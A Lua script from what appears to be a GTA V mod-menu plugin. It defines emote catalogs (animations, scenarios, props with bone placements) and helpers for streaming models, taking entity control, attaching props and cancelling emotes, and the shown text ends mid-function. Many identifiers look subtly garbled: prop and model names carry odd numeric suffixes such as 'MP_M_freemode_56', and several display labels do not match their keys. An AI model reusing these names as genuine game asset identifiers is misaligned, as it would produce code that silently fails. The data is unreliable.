  ["atm"] = {"Scenario", "PROP_HUMAN_ATM", "ATM"},
  ["bark"] = {"random@peyote@dog", "wakeup", "Bark"},
  ["bartender"] = {"anim@amb@clubhouse@bar@drink@idle_a", "idle_a_bartender", "Bartender", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["bbq"] = {"MaleScenario", "PROP_HUMAN_BBQ", "BBQ"},
  ["beast"] = {"anim@mp_fm_event@intro", "beast_transform", "Beast", AnimationOptions = {EmoteDuration = 5000, EmoteMoving = true}},
  ["bird"] = {"random@peyote@bird", "wakeup", "Bird"},
  ["blowkiss"] = {"anim@mp_player_intcelebrationfemale@blow_kiss", "blow_kiss", "Blow Kiss"},
  ["boi"] = {"special_ped@jane@monologue_3@monologue_3c", "brotheradrianhasshown_3", "BOI", AnimationOptions = {EmoteDuration = 3000, EmoteMoving = true}},
  ["bow"] = {"anim@arena@celeb@podium@no_prop@", "regal_c_4st", "Bow", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["boxing"] = {"anim@mp_player_intcelebrationmale@shadow_boxing", "shadow_boxing", "Boxing", AnimationOptions = {EmoteDuration = 4000, EmoteMoving = true}},
  ["bringiton"] = {"misscommon@response", "bring_it_on", "Bring It On", AnimationOptions = {EmoteDuration = 3000, EmoteMoving = true}},
  ["bumsleep"] = {"Scenario", "WORLD_HUMAN_BUM_SLUMPED", "Bum Sleep"},
  ["celebrate"] = {"rcmfanatic7celebrate", "celebrate", "Celebrate", AnimationOptions = {EmoteLoop = true}},
  ["cheer"] = {"Scenario", "WORLD_HUMAN_CHEERING", "Cheer"},
  ["chicken"] = {"random@peyote@chicken", "wakeup", "Chicken", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["chill"] = {"switch@trevor@scares_tramp", "trev_scares_tramp_idle_tramp", "Chill", AnimationOptions = {EmoteLoop = true}},
  ["chinup"] = {"Scenario", "PROP_HUMAN_MUSCLE_CHIN_UPS", "Chinup"},
  ["clap"] = {"amb@world_human_cheering@male_a", "base", "Clap", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["cloudgaze"] = {"switch@trevor@annoys_sunbathers", "trev_annoys_sunbathers_loop_girl", "Cloudgaze", AnimationOptions = {EmoteLoop = true}},
  ["comeatmebro"] = {"mini@triathlon", "want_some_of_this", "Come at me bro", AnimationOptions = {EmoteDuration = 2000, EmoteMoving = true}},
  ["cop"] = {"Scenario", "WORLD_HUMAN_COP_IDLES", "Cop"},
  ["cough"] = {"timetable@gardener@smoking_joint", "idle_cough", "Cough", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["countdown"] = {"random@street_race", "grid_girl_race_start", "Countdown", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["cpr"] = {"mini@cpr@char_a@cpr_str", "cpr_pumpchest", "CPR", AnimationOptions = {EmoteLoop = true}},
  ["crossarms"] = {"amb@world_human_hang_out_street@female_arms_crossed@idle_a", "idle_a", "Crossarms", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["curtsy"] = {"anim@mp_player_intcelebrationpaired@f_f_sarcastic", "sarcastic_left", "Curtsy"},
  ["cutthroat"] = {"anim@mp_player_intcelebrationmale@cut_throat", "cut_throat", "Cut Throat"},
  ["damn"] = {"gestures@m@standing@casual", "gesture_damn", "Damn", AnimationOptions = {EmoteDuration = 1000, EmoteMoving = true}},
  ["dj"] = {"anim@amb@nightclub@djs@dixon@", "dixn_dance_cntr_open_dix", "DJ", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["drink"] = {"mp_player_inteat@pnq", "loop", "Drink", AnimationOptions = {EmoteDuration = 2500, EmoteMoving = true}},
  ["eat"] = {"mp_player_inteat@burger", "mp_player_int_eat_burger", "Eat", AnimationOptions = {EmoteDuration = 3000, EmoteMoving = true}},
  ["facepalm"] = {"random@car_thief@agitated@idle_a", "agitated_idle_a", "Facepalm", AnimationOptions = {EmoteDuration = 8000, EmoteMoving = true}},
  ["fallasleep"] = {"mp_sleep", "sleep_loop", "Fall Asleep", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["fallover"] = {"random@drunk_driver_7", "drunk_fall_over", "Fall Over"},
  ["fightme"] = {"anim@deathmatch_intros@unarmed", "intro_male_unarmed_c", "Fight Me"},
  ["finger"] = {"anim@mp_player_intselfiethe_bird", "idle_a", "Finger", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["fishdance"] = {"anim@mp_player_intupperfind_the_fish", "idle_a", "Fish Dance", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["flex"] = {"Scenario", "WORLD_HUMAN_MUSCLE_FLEX", "Flex"},
  ["flip"] = {"anim@arena@celeb@flat@solo@no_props@", "flip_a_player_a", "Flip"},
  ["flipoff"] = {"anim@arena@celeb@podium@no_prop@", "flip_off_a_6st", "Flip Off", AnimationOptions = {EmoteMoving = true}},
  ["foldarms"] = {"anim@amb@business@bgen@bgen_no_work@", "stand_phone_phoneputdown_idle_nowork", "Fold Arms", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["gangsign"] = {"mp_player_int_uppergang_sign_a", "mp_player_int_gang_sign_a", "Gang Sign", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["golfswing"] = {"rcmnigel6d", "swing_a_mark", "Golf Swing"},
  ["guard"] = {"Scenario", "WORLD_HUMAN_GUARD_STAND", "Guard"},
  ["hammer"] = {"Scenario", "WORLD_HUMAN_HAMMERING", "Hammer"},
  ["handshake"] = {"mp_ped_interaction", "handshake_guy_a", "Handshake", AnimationOptions = {EmoteDuration = 3000, EmoteMoving = true}},
  ["handsup"] = {"missminuteman_5ig_6", "handsup_base", "Hands Up", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["hangout"] = {"Scenario", "WORLD_HUMAN_HANG_OUT_STREET", "Hangout"},
  ["headbutt"] = {"melee@unarmed@streamed_variations", "plyr_takedown_front_headbutt", "Headbutt"},
  ["hiking"] = {"move_m@hiking", "idle", "Hiking", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["hug"] = {"mp_ped_interaction", "kisses_guy_a", "Hug"},
  ["idle"] = {"anim@heists@heist_corona@team_idles@male_a", "idle", "Idle", AnimationOptions = {EmoteLoop = true}},
  ["idledrunk"] = {"random@drunk_driver_9", "drunk_driver_stand_loop_dd8", "Idle Drunk", AnimationOptions = {EmoteLoop = true}},
  ["impatient"] = {"Scenario", "WORLD_HUMAN_STAND_IMPATIENT", "Impatient"},
  ["inspect"] = {"random@train_tracks", "idle_e", "Inspect"},
  ["janitor"] = {"Scenario", "WORLD_HUMAN_JANITOR", "Janitor"},
  ["jazzhands"] = {"anim@mp_player_intcelebrationfemale@jazz_hands", "jazz_hands", "Jazzhands", AnimationOptions = {EmoteDuration = 6000, EmoteMoving = true}},
  ["jog"] = {"Scenario", "WORLD_HUMAN_JOG_STANDING", "Jog"},
  ["jumpingjacks"] = {"timetable@reunited@ig_1", "jimmy_getknocked", "Jumping Jacks", AnimationOptions = {EmoteLoop = true}},
  ["karate"] = {"anim@mp_player_intcelebrationfemale@karate_chops", "karate_chops", "Karate"},
  ["keyfob"] = {"anim@mp_player_intmenu@key_fob@", "fob_click", "Key Fob", AnimationOptions = {EmoteDuration = 1000, EmoteLoop = false, EmoteMoving = true}},
  ["kneel"] = {"Scenario", "CODE_HUMAN_MEDIC_KNEEL", "Kneel"},
  ["knock"] = {"timetable@jimmy@doorknock@", "knockdoor_idle", "Knock", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["knucklecrunch"] = {"anim@mp_player_intcelebrationfemale@knuckle_crunch", "knuckle_crunch", "Knuckle Crunch", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["lapdance"] = {"mp_safehouse", "lap_dance_girl", "Lapdance"},
  ["leafblower"] = {"MaleScenario", "WORLD_HUMAN_GARDENER_LEAF_BLOWER", "Leafblower"},
  ["lean"] = {"Scenario", "WORLD_HUMAN_LEANING", "Lean"},
  ["lookout"] = {"Scenario", "CODE_HUMAN_CROSS_ROAD_WAIT", "Lookout"},
  ["medic"] = {"Scenario", "CODE_HUMAN_MEDIC_TEND_TO_DEAD", "Medic"},
  ["mechanic"] = {"mini@repair", "fixing_a_ped", "Mechanic", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["metal"] = {"anim@mp_player_intincarrockstd@ps@", "idle_a", "Metal", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["mindblown"] = {"anim@mp_player_intcelebrationmale@mind_blown", "mind_blown", "Mind Blown", AnimationOptions = {EmoteDuration = 4000, EmoteMoving = true}},
  ["mindcontrol"] = {"rcmbarry", "mind_control_b_loop", "Mind Control", AnimationOptions = {EmoteLoop = true}},
  ["namaste"] = {"timetable@amanda@ig_7", "ig_2_base", "Namaste", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["no"] = {"anim@heists@ornate_bank@chat_manager", "fail", "No", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["noway"] = {"gestures@m@standing@casual", "gesture_no_way", "No Way", AnimationOptions = {EmoteDuration = 1500, EmoteMoving = true}},
  ["ok"] = {"anim@mp_player_intselfiedock", "idle_a", "OK", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["outofbreath"] = {"re@construction", "out_of_breath", "Out of Breath", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["party"] = {"Scenario", "WORLD_HUMAN_PARTYING", "Party"},
  ["peace"] = {"mp_player_int_upperpeace_sign", "mp_player_int_peace_sign", "Peace", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["pee"] = {"misscarsteal2peeing", "peeing_loop", "Pee", AnimationOptions = {EmoteStuck = true, PtfxAsset = "scr_amb_chop", PtfxName = "ent_anim_dog_peeing", PtfxNoProp = true, PtfxPlacement = {-0.05, 0.3, 0, 0, 90, 90, 1}, PtfxWait = 3000}},
  ["pickup"] = {"random@domestic", "pickup_low", "Pickup"},
  ["point"] = {"gestures@f@standing@casual", "gesture_point", "Point", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["push"] = {"missfinale_c3ig_22", "pushcar_offcliff_f", "Push", AnimationOptions = {EmoteLoop = true}},
  ["pushup"] = {"amb@world_human_push_ups@male@idle_a", "idle_d", "Pushup", AnimationOptions = {EmoteLoop = true}},
  ["rabbit"] = {"random@peyote@rabbit", "wakeup", "Rabbit"},
  ["salute"] = {"anim@mp_player_intincarsalutestd@ds@", "idle_a", "Salute", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["scared"] = {"random@domestic", "f_distressed_loop", "Scared", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["screwyou"] = {"misscommon@response", "screw_you", "Screw You", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["shakeoff"] = {"move_m@_idles@shake_off", "shakeoff_8", "Shake Off", AnimationOptions = {EmoteDuration = 3500, EmoteMoving = true}},
  ["sit"] = {"anim@amb@business@bgen@bgen_no_work@", "sit_phone_phoneputdown_idle_nowork", "Sit", AnimationOptions = {EmoteLoop = true}},
  ["slowclap"] = {"anim@mp_player_intcelebrationfemale@slow_clap", "slow_clap", "Slow Clap", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["smoke"] = {"Scenario", "WORLD_HUMAN_SMOKING", "Smoke"},
  ["surrender"] = {"random@arrests@busted", "idle_a", "Surrender", AnimationOptions = {EmoteLoop = true}},
  ["texting"] = {"Scenario", "WORLD_HUMAN_STAND_MOBILE", "Texting"},
  ["think"] = {"misscarsteal3@aliens", "rehearsal_base_idle_director", "Think", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["thumbsup"] = {"anim@mp_player_intupperthumbs_up", "idle_a", "Thumbs Up", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["wave"] = {"friends@frj@ig_2", "wave_a", "Wave", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["yeah"] = {"anim@mp_player_intupperair_shagging", "idle_a", "Yeah", AnimationOptions = {EmoteLoop = true, EmoteMoving = true}},
  ["yoga"] = {"Scenario", "WORLD_HUMAN_YOGA", "Yoga"},
}

PropEmotes = {
  ["backpack"] = {"move_p_m_zero_rucksack", "idle", "Backpack", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "p_michael_backpack_s", PropBone = 24818, PropPlacement = {0.07, -0.11, -0.05, 0, 90, 175}}},
  ["beer"] = {"amb@world_human_drinking@coffee@male@idle_a", "idle_c", "Beer", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_amb_beer_bottle", PropBone = 28422, PropPlacement = {0, 0, 0, 0, 0, 0}}},
  ["beg"] = {"amb@world_human_bum_freeway@male@base", "base", "Beg", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_beggers_sign_36", PropBone = 58868, PropPlacement = {0.19, 0.18, 0, 5, 0, 40}}},
  ["bong"] = {"anim@safehouse@bong", "bong_stage5", "Bong", AnimationOptions = {Prop = "hei_heist_sh_bong_01", PropBone = 18905, PropPlacement = {0.1, -0.25, 0, 95, 190, 180}}},
  ["book"] = {"cellphone@", "cellphone_text_read_base", "Book", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_novel_45", PropBone = 6286, PropPlacement = {0.15, 0.03, -0.065, 0, 180, 90}}},
  ["bouquet"] = {"impexp_int-1", "mp_m_waremech_90_dual-9", "Bouquet", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_snow_flower_46", PropBone = 24817, PropPlacement = {-0.29, 0.4, -0.02, -90, -90, 0}}},
  ["box"] = {"anim@heists@box_carry@", "idle", "Box", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "hei_prop_heist_box", PropBone = 60309, PropPlacement = {0.025, 0.08, 0.255, -145, 290, 0}}},
  ["brief1"] = {"missheistdocksprep4hold_cellphone", "static", "Brief 3", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_ld_case_67", PropBone = 57005, PropPlacement = {0.1, 0, 0, 0, 280, 53}}},
  ["burger"] = {"mp_player_inteat@burger", "mp_player_int_eat_burger", "Burger", AnimationOptions = {EmoteMoving = true, Prop = "prop_cs_burger_01", PropBone = 18905, PropPlacement = {0.13, 0.05, 0.02, -50, 16, 60}}},
  ["camera"] = {"amb@world_human_paparazzi@male@base", "base", "Camera", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_pap_camera_12", PropBone = 28422, PropPlacement = {0, 0, 0, 0, 0, 0}, PtfxAsset = "scr_bike_business", PtfxName = "scr_bike_cfid_camera_flash", PtfxPlacement = {0, 0, 0, 0, 0, 0, 1}, PtfxWait = 200}},
  ["champagne"] = {"anim@heists@humane_labs@finale@keycards", "ped_a_enter_loop", "Champagne", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_drink_champ", PropBone = 18905, PropPlacement = {0.1, -0.03, 0.03, -100, 0, -10}}},
  ["champagnespray"] = {"anim@mp_player_intupperspray_champagne", "idle_a", "Champagne Spray", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "ba_prop_battle_champ_open", PropBone = 28422, PropPlacement = {0, 0, 0, 0, 0, 0}, PtfxAsset = "scr_ba_club", PtfxName = "scr_ba_club_champagne_spray", PtfxPlacement = {0, 0, 0, 0, 0, 0}, PtfxWait = 500}},
  ["cig"] = {"amb@world_human_smoking@male@male_a@enter", "enter", "Cig", AnimationOptions = {EmoteDuration = 2600, EmoteMoving = true, Prop = "prop_amb_ciggy_56", PropBone = 47419, PropPlacement = {0.015, -0.009, 0.003, 55, 0, 110}}},
  ["cigar"] = {"amb@world_human_smoking@male@male_a@enter", "enter", "Cigar", AnimationOptions = {EmoteDuration = 2600, EmoteMoving = true, Prop = "prop_cigar_24", PropBone = 47419, PropPlacement = {0.01, 0, 0, 50, 0, -80}}},
  ["cigar4"] = {"amb@world_human_smoking@male@male_a@enter", "enter", "Cigar 2", AnimationOptions = {EmoteDuration = 2600, EmoteMoving = true, Prop = "prop_cigar_90", PropBone = 47419, PropPlacement = {0.01, 0, 0, 50, 0, -80}}},
  ["clean"] = {"timetable@floyd@clean_kitchen@base", "base", "Clean", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_sponge_01", PropBone = 28422, PropPlacement = {0, 0, -0.01, 90, 0, 0}}},
  ["clean2"] = {"amb@world_human_maid_clean@", "base", "Clean 7", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_sponge_34", PropBone = 28422, PropPlacement = {0, 0, -0.01, 90, 0, 0}}},
  ["clipboard"] = {"missfam8", "base", "Clipboard", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "p_amb_clipboard_56", PropBone = 36029, PropPlacement = {0.16, 0.08, 0.1, -130, -50, 0}}},
  ["coffee"] = {"amb@world_human_drinking@coffee@male@idle_a", "idle_c", "Coffee", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "p_amb_coffeecup_78", PropBone = 28422, PropPlacement = {0, 0, 0, 0, 0, 0}}},
  ["cup"] = {"amb@world_human_drinking@coffee@male@idle_a", "idle_c", "Cup", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_plastic_cup_57", PropBone = 28422, PropPlacement = {0, 0, 0, 0, 0, 0}}},
  ["donut"] = {"mp_player_inteat@burger", "mp_player_int_eat_burger", "Donut", AnimationOptions = {EmoteMoving = true, Prop = "prop_amb_donut", PropBone = 18905, PropPlacement = {0.13, 0.05, 0.02, -50, 16, 60}}},
  ["egobar"] = {"mp_player_inteat@burger", "mp_player_int_eat_burger", "Ego Bar", AnimationOptions = {EmoteMoving = true, Prop = "prop_choc_ego", PropBone = 60309, PropPlacement = {0, 0, 0, 0, 0, 0}}},
  ["flute"] = {"anim@heists@humane_labs@finale@keycards", "ped_a_enter_loop", "Flute", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_champ_flute", PropBone = 18905, PropPlacement = {0.1, -0.03, 0.03, -100, 0, -10}}},
  ["guitar"] = {"amb@world_human_musician@guitar@male@idle_a", "idle_b", "Guitar", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_acc_guitar_34", PropBone = 24818, PropPlacement = {-0.1, 0.31, 0.1, 0, 20, 150}}},
  ["guitar5"] = {"switch@trevor@guitar_beatdown", "667936_68_trvs_4_guitar_beatdown_idle_busker", "Guitar 5", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_acc_guitar_34", PropBone = 24818, PropPlacement = {-0.05, 0.31, 0.1, 0, 20, 150}}},
  ["guitarelectric"] = {"amb@world_human_musician@guitar@male@idle_a", "idle_b", "Guitar Electric", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_el_guitar_56", PropBone = 24818, PropPlacement = {-0.1, 0.31, 0.1, 0, 20, 150}}},
  ["guitarelectric3"] = {"amb@world_human_musician@guitar@male@idle_a", "idle_b", "Guitar Electric 4", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_el_guitar_70", PropBone = 24818, PropPlacement = {-0.1, 0.31, 0.1, 0, 20, 150}}},
  ["joint"] = {"amb@world_human_smoking@male@male_a@enter", "enter", "Joint", AnimationOptions = {EmoteDuration = 2600, EmoteMoving = true, Prop = "p_cs_joint_57", PropBone = 47419, PropPlacement = {0.015, -0.009, 0.003, 55, 0, 110}}},
  ["makeitrain"] = {"anim@mp_player_intupperraining_cash", "idle_a", "Make It Rain", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_anim_cash_pile_12", PropBone = 60309, PropPlacement = {0, 0, 0, 180, 0, 70}, PtfxAsset = "scr_xs_celebration", PtfxName = "scr_xs_money_rain", PtfxPlacement = {0, 0, -0.09, -80, 0, 0, 1}, PtfxWait = 500}},
  ["map"] = {"amb@world_human_tourist_map@male@base", "base", "Map", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_tourist_map_78", PropBone = 28422, PropPlacement = {0, 0, 0, 0, 0, 0}}},
  ["mugshot"] = {"mp_character_creation@customise@male_a", "loop", "Mugshot", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_police_id_board", PropBone = 58868, PropPlacement = {0.12, 0.24, 0, 5, 0, 70}}},
  ["notepad"] = {"missheistdockssetup7clipboard@base", "base", "Notepad", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_notepad_01", PropBone = 18905, PropPlacement = {0.1, 0.02, 0.05, 10, 0, 0}, SecondProp = "prop_pencil_34", SecondPropBone = 58866, SecondPropPlacement = {0.11, -0.02, 0.001, -120, 0, 0}}},
  ["phone"] = {"cellphone@", "cellphone_text_read_base", "Phone", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_npc_phone_46", PropBone = 28422, PropPlacement = {0, 0, 0, 0, 0, 0}}},
  ["phonecall"] = {"cellphone@", "cellphone_call_listen_base", "Phone Call", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_npc_phone_13", PropBone = 28422, PropPlacement = {0, 0, 0, 0, 0, 0}}},
  ["rose"] = {"anim@heists@humane_labs@finale@keycards", "ped_a_enter_loop", "Rose", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_single_rose", PropBone = 18905, PropPlacement = {0.13, 0.15, 0, -100, 0, -20}}},
  ["sandwich"] = {"mp_player_inteat@burger", "mp_player_int_eat_burger", "Sandwich", AnimationOptions = {EmoteMoving = true, Prop = "prop_sandwich_78", PropBone = 18905, PropPlacement = {0.13, 0.05, 0.02, -50, 16, 60}}},
  ["smoke0"] = {"amb@world_human_aa_smoke@male@idle_a", "idle_c", "Smoke 7", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_cs_ciggy_34", PropBone = 28422, PropPlacement = {0, 0, 0, 0, 0, 0}}},
  ["smoke2"] = {"amb@world_human_smoking@female@idle_a", "idle_b", "Smoke 2", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_cs_ciggy_45", PropBone = 28422, PropPlacement = {0, 0, 0, 0, 0, 0}}},
  ["smoke4"] = {"amb@world_human_aa_smoke@male@idle_a", "idle_b", "Smoke 3", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_cs_ciggy_01", PropBone = 28422, PropPlacement = {0, 0, 0, 0, 0, 0}}},
  ["soda"] = {"amb@world_human_drinking@coffee@male@idle_a", "idle_c", "Soda", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_ecola_can", PropBone = 28422, PropPlacement = {0, 0, 0, 0, 0, 130}}},
  ["suitcase"] = {"missheistdocksprep2hold_cellphone", "static", "Suitcase", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_ld_suitcase_89", PropBone = 57005, PropPlacement = {0.39, 0, 0, 0, 266, 60}}},
  ["suitcase2"] = {"missheistdocksprep1hold_cellphone", "static", "Suitcase 5", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_security_case_45", PropBone = 57005, PropPlacement = {0.1, 0, 0, 0, 280, 53}}},
  ["tablet"] = {"amb@world_human_tourist_map@male@base", "base", "Tablet", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_cs_tablet", PropBone = 28422, PropPlacement = {0, -0.03, 0, 20, -90, 0}}},
  ["tablet5"] = {"amb@code_human_in_bus_passenger_idles@female@tablet@idle_a", "idle_a", "Tablet 5", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_cs_tablet", PropBone = 28422, PropPlacement = {-0.05, 0, 0, 0, 0, 0}}},
  ["teddy"] = {"impexp_int-3", "mp_m_waremech_12_dual-1", "Teddy", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "v_ilev_mr_rasberryclean", PropBone = 24817, PropPlacement = {-0.2, 0.46, -0.016, -180, -90, 0}}},
  ["umbrella"] = {"amb@world_human_drinking@coffee@male@base", "base", "Umbrella", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "p_amb_brolly_34", PropBone = 57005, PropPlacement = {0.15, 0.005, 0, 87, -20, 180}}},
  ["whiskey"] = {"amb@world_human_drinking@coffee@male@idle_a", "idle_c", "Whiskey", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_drink_whisky", PropBone = 28422, PropPlacement = {0.01, -0.01, -0.06, 0, 0, 0}}},
  ["wine"] = {"anim@heists@humane_labs@finale@keycards", "ped_a_enter_loop", "Wine", AnimationOptions = {EmoteLoop = true, EmoteMoving = true, Prop = "prop_drink_redwine", PropBone = 18905, PropPlacement = {0.1, -0.03, 0.03, -100, 0, -10}}},
}

emoteCatalog = {
  Naughty = NaughtyEmotes,
  Dances = Dances,
  Emotes = Emotes,
  PropEmotes = PropEmotes,
}

function SendNotif(message)
  notify(message)
end

local function modelHash(model)
  if type(model) == "number" then
    return model
  end

  if tonumber(model) then
    return tonumber(model)
  end

  if Utils and Utils.Joaat then
    return Utils.Joaat(model)
  end

  return MISC.GET_HASH_KEY(model)
end

local function waitUntil(predicate, timeoutMs, yieldMs)
  local startedAt = MISC.GET_GAME_TIMER()
  timeoutMs = timeoutMs or 10000
  yieldMs = yieldMs or 10

  while not predicate() do
    if ShouldUnload() then
      return false
    end

    if MISC.GET_GAME_TIMER() - startedAt >= timeoutMs then
      return false
    end

    Script.Yield(yieldMs)
  end

  return true
end

function loadAnimDict(dict, timeoutMs)
  if not dict or dict == "" then
    return false
  end

  if STREAMING.HAS_ANIM_DICT_LOADED(dict) then
    return true
  end

  STREAMING.REQUEST_ANIM_DICT(dict)
  return waitUntil(function()
    return STREAMING.HAS_ANIM_DICT_LOADED(dict)
  end, timeoutMs or 10000, 50)
end

function request_model(model, timeoutMs)
  local hash = modelHash(model)
  if not hash then
    return false
  end

  if STREAMING.HAS_MODEL_LOADED(hash) then
    return true
  end

  STREAMING.REQUEST_MODEL(hash)
  return waitUntil(function()
    return STREAMING.HAS_MODEL_LOADED(hash)
  end, timeoutMs or 10000, 10)
end

function request_control(entity, timeoutMs)
  if entity == nil or entity == 0 then
    return false
  end

  timeoutMs = timeoutMs or 10000
  local startedAt = MISC.GET_GAME_TIMER()

  while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) do
    if ShouldUnload() or MISC.GET_GAME_TIMER() - startedAt >= timeoutMs then
      break
    end

    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    Script.Yield(10)
  end

  local hasControl = NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
  if isDev then
    local state = hasControl and "Gained" or "Failed to get"
    Logger.Log(eLogColor.GREEN, "K-Script [DEBUG]", ("%s control over Entity 0x%X"):format(state, entity))
  end

  return hasControl
end

function getPlayerPed()
  return GTA.PointerToHandle(GTA.GetLocalPed())
end

function getPlayerPosition(playerId)
  if playerId == nil or playerId == GTA.GetLocalPlayerId() then
    return V3.New(ENTITY.GET_ENTITY_COORDS(getPlayerPed(), false))
  end

  return V3.New(NETWORK.NETWORK_GET_LAST_PLAYER_POS_RECEIVED_OVER_NETWORK(playerId))
end

function setEntProofs(entity)
  ENTITY.SET_ENTITY_INVINCIBLE(entity, true)
  ENTITY.SET_ENTITY_PROOFS(entity, true, true, true, true, true, true, true, true, false, true)
end

function EntityExists(entity)
  if entity == nil or entity == 0 then
    return false
  end

  if ENTITY.DOES_ENTITY_EXIST and not ENTITY.DOES_ENTITY_EXIST(entity) then
    return false
  end

  local pointer = GTA.HandleToPointer and GTA.HandleToPointer(entity) or nil
  return pointer ~= nil and pointer ~= 0
end

function DeleteEnt(entity)
  if entity == nil or entity == 0 then
    return
  end

  request_control(entity)

  local entityPointer = Memory.AllocInt()
  Memory.WriteInt(entityPointer, entity)
  ENTITY.DELETE_ENTITY(entityPointer)
  Memory.Free(entityPointer)
end

function DestroyAllProps()
  for index = #EmoteState.activeProps, 1, -1 do
    local prop = EmoteState.activeProps[index]
    if EntityExists(prop) then
      DeleteEnt(prop)
    end
    table.remove(EmoteState.activeProps, index)
  end

  EmoteState.hasAttachedProps = false
  EmoteState.hasSecondProp = false
end

function EmoteCancel()
  local ped = PLAYER.GET_PLAYER_PED(-1)

  if EmoteState.scenarioType == "MaleScenario" or EmoteState.scenarioType == "Scenario" then
    if EmoteState.playing then
      TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
    end
  end

  if EmoteState.playing then
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
    DestroyAllProps()
  end

  EmoteState.currentDict = ""
  EmoteState.currentAnim = ""
  EmoteState.currentLabel = ""
  EmoteState.currentDuration = -1
  EmoteState.currentFlags = 0
  EmoteState.scenarioType = ""
  EmoteState.playing = false
end

function CheckGender()
  local localPed = GTA.GetLocalPed()
  if localPed == nil or localPed.ModelInfo == nil then
    return nil
  end

  local maleFreemode = MISC.GET_HASH_KEY("MP_M_freemode_56")
  if localPed.ModelInfo.Model == maleFreemode then
    return "male"
  end

  return "female"
end

local function normalizePlacement(placement)
  placement = placement or {}
  return placement[1] or 0,
    placement[2] or 0,
    placement[3] or 0,
    placement[4] or 0,
    placement[5] or 0,
    placement[6] or 0
end

function AddPropToPlayer(propName, boneId, placement)
  local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(GTA.GetLocalPlayerId())
  local x, y, z = ENTITY.GET_ENTITY_COORDS(ped, false)
  local hash = modelHash(propName)

  if not request_model(hash) then
    notify(("Failed to load prop model: %s"):format(tostring(propName)))
    return nil
  end

